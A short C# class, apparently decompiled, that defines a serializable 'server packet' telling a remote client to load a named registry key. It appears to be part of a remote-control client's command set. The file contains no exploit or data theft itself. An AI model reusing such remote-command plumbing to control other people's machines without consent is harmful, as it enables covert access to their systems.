using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoLoadRegistryKey : GInterface4
{
	public string RootKeyName { get; set; }

	public DoLoadRegistryKey(string rootKeyName)
	{
		RootKeyName = rootKeyName;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
